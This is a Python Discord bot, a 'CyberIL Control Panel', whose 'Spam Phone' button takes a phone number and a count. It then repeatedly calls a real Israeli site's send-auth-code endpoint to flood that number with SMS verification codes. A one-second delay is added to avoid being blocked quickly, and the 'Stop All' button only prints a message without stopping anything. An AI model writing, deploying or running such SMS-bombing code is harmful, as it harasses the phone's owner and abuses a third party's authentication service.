import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio

TOKEN = os.getenv('DISCORD_TOKEN')

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"Synced slash commands for {self.user}")

bot = MyBot()

# --- לוגיקת השליחה (ה-API שלך) ---
async def send_spam(phone, amount):
    url = "https://users-auth.hamal.co.il/auth/send-auth-code"
    headers = {"Content-Type": "application/json"}
    payload = {
        "value": phone,
        "type": "phone",
        "projectId": "1"
    }
    
    for i in range(int(amount)):
        try:
            # משתמשים ב-to_thread כדי לא לתקוע את הבוט בזמן הבקשה
            response = await asyncio.to_thread(requests.post, url, json=payload, headers=headers)
            print(f"Sent to {phone} | Status: {response.status_code}")
            # מחכים שנייה בין שליחה לשליחה כדי לא להיחסם מהר מדי
            await asyncio.sleep(1) 
        except Exception as e:
            print(f"Error sending to {phone}: {e}")

# --- חלונית קופצת ---
class SpamModal(discord.ui.Modal, title='Spam Configuration'):
    phone = discord.ui.TextInput(label='Phone Number', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    amount = discord.ui.TextInput(label='Amount', placeholder='1-50', default='10')

    async def on_submit(self, interaction: discord.Interaction):
        # הודעה ראשונית למשתמש
        await interaction.response.send_message(f"🚀 Started! Sending {self.amount.value} requests to {self.phone.value}...", ephemeral=True)
        
        # הרצת הלוגיקה של השליחה ברקע
        await send_spam(self.phone.value, self.amount.value)

# --- פאנל שליטה ---
class ControlPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.danger, custom_id="spam_btn")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SpamModal())

    @discord.ui.button(label="Stop All", style=discord.ButtonStyle.secondary, custom_id="stop_btn")
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("🛑 All processes stopped.", ephemeral=True)

@bot.tree.command(name="setup", description="מפעיל את לוח הבקרה")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="⚡ CyberIL Control Panel",
        description="Welcome to the main control interface.\nSelect an action below to begin.",
        color=discord.Color.red()
    )
    embed.set_footer(text="Created by Asaf Dev Studio")
    await interaction.response.send_message(embed=embed, view=ControlPanelView())

@bot.event
async def on_ready():
    print(f'✅ {bot.user} is online and ready!')

bot.run(TOKEN)
